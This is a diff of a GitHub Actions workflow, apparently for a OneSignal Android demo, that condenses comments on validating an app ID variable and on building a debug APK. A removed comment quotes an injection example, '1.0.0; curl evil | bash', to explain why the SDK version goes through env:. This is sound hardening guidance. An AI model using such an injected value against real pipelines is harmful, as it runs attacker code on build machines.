@@ -25,14 +25,8 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      # Fail fast when the org/repo variable is unset (forks, re-orgs, renames).
-      # An undefined `vars.*` expression evaluates to "" in GitHub Actions, and
-      # the composite action's `required: true` only validates that the `with:`
-      # key was supplied — not that the resolved value is non-empty. Without
-      # this guard the demo's `demoOverride()` silently collapses the empty
-      # value to null and the build falls through to the hardcoded default app
-      # ID, exercising the wrong OneSignal project on BrowserStack with a
-      # green CI result.
+      # Fail fast on unset var. Otherwise `demoOverride()` collapses "" to
+      # null and the build silently uses the hardcoded default app ID.
       - name: Validate APPIUM_ONESIGNAL_APP_ID
         env:
           ONESIGNAL_APP_ID: ${{ vars.APPIUM_ONESIGNAL_APP_ID }}
@@ -69,19 +63,12 @@ jobs:
         with:
           version: ${{ steps.android-sdk-version.outputs.version }}
 
+      # gms+debug: BrowserStack devices have GMS, debug enables UiAutomator2
+      # attach. -PSDK_VERSION pins the Maven dep to the version we waited
+      # for. SDK_VERSION flows through env: to avoid script injection
+      # (workflow_dispatch input is user-controlled).
       - name: Build debug APK
         working-directory: examples/demo
-        # Build the gms-debug variant: BrowserStack devices all run Google
-        # Play Services, and debug ensures isDebuggable=true so Appium's
-        # UiAutomator2 driver can attach. The Maven-resolved OneSignal
-        # dependency is pinned to the version we just waited for, so the
-        # APK exercises the actual published artifact.
-        #
-        # The resolved version flows through `env:` rather than direct
-        # `${{ }}` interpolation into the run block. Without this, a
-        # workflow_dispatch input like `1.0.0; curl evil | bash` would be
-        # template-substituted into the shell script before bash parsed it.
-        # https://docs.github.com/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
         env:
           SDK_VERSION: ${{ steps.android-sdk-version.outputs.version }}
         run: ./gradlew :app:assembleGmsDebug "-PSDK_VERSION=$SDK_VERSION" --console=plain --warning-mode=summary
